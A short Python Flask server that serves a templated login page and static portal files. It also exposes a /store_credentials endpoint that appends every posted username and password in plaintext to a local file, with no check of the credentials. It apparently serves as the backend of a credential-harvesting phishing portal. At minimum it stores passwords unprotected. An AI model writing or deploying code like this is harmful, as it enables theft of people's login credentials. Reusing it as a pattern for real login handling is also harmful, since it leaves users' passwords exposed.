from flask import Flask, render_template, request, jsonify, send_from_directory
import os

# Create Flask app and set templates directory
app = Flask(__name__, template_folder='templates')

# Route: Redirect home page (/) to /login using an HTML redirect
@app.route('/')
def home_redirect():
    return render_template('redirect.html')

# Route: Login page served via template
@app.route('/login')
def login_page():
    return render_template('login.html')

# Route: Serve static files from login-portal/files/
@app.route('/files/<path:filename>')
def serve_custom_static(filename):
    return send_from_directory(
        os.path.join(os.path.dirname(__file__), '../login-portal/files'),
        filename
    )

# Route: Save posted credentials to database/users.db
@app.route('/store_credentials', methods=['POST'])
def store_credentials():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    # Ensure database folder exists
    db_path = os.path.join(os.path.dirname(__file__), '../database')
    os.makedirs(db_path, exist_ok=True)

    # Write credentials to file
    with open(os.path.join(db_path, 'users.db'), 'a') as db_file:
        db_file.write(f'{username},{password}\n')

    return jsonify({'message': 'Credentials stored successfully'})

# Run the Flask server
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
